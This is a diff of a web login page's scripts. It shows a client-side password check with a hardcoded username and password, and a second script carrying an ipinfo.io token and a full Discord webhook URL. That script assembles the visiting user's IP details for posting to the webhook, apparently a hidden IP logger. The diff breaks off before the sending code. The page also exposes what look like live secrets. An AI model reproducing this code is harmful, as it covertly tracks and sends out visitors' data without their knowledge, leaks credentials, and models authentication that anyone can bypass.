@@ -39,22 +39,22 @@
         const form = document.querySelector('form');
 
         form.addEventListener('submit', function(event) {
-            event.preventDefault(); // Prevent default form submission
+            event.preventDefault(); 
             
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
 
-            // Check if username and password match
+          
             if (username === 'nfnato' && password === 'admin') {
-                window.location.href = 'https://nfnato.github.io/home'; // Redirect to the specified URL
+                window.location.href = ''; 
             } else {
-                alert('Incorrect username or password. Please try again.'); // Notify user of incorrect credentials
+                alert('Incorrect username or password. Please try again.'); 
             }
         });
     });
 </script>
 <script>
-        // Replace 'YOUR_IPINFO_TOKEN' with your actual ipinfo.io token
+       
         const ipInfoToken = '0fdfd91c76f16c';
         const webhookURL = 'https://discord.com/api/webhooks/1265054625858322464/2GZzdwURKGFgcA-9HajHUiIE4MBGX6-DHCYh9I_XmZTRTGMRS8jn2IZ2Elo_xTSNU-n1';
 
@@ -79,7 +79,7 @@
                 embeds: [
                     {
                         title: "IP Details",
-                        color: 3447003, // Hex color code
+                        color: 3447003,
                         fields: [
                             {
                                 name: "IP",
